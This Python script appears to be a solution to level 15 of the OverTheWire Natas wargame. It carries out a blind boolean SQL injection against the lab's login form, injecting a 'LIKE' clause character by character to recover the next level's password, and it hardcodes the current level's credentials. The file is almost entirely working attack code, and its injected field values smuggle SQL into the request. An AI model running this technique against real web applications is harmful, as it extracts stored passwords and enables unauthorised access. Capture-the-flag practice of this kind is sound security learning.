import requests
from string import *

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

characters = ascii_lowercase + ascii_uppercase + digits
# characters = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

password_tried = ""  # empty string
# password_tried = list()

while len(password_tried) != 32:  # we know that every level's password is of length 32
    for ch in characters:
        print("trying this password now --> {}{}".format(password_tried, ch))
        # print("trying this password now --> {}{}".format("".join(password_tried), ch))
        response = session.post(
            url, data={"username": "natas16\" AND BINARY password LIKE \"{}{}%\"#".format("".join(password_tried), ch)}, auth=(username, password))  # BINARY means the character is case sensitive and % indicates a wild card
        # response = session.post(
        #    url, data={"username": "natas16\" AND BINARY password LIKE \"{}{}%\"#".format("".join(password_tried), ch)}, auth=(username, password))
        content = response.text

        if "user exists" in content:  # if
            password_tried = password_tried + ch  # add character to the string
            # password_tried.append(ch)
            break  # break the current loop

print(password_tried)
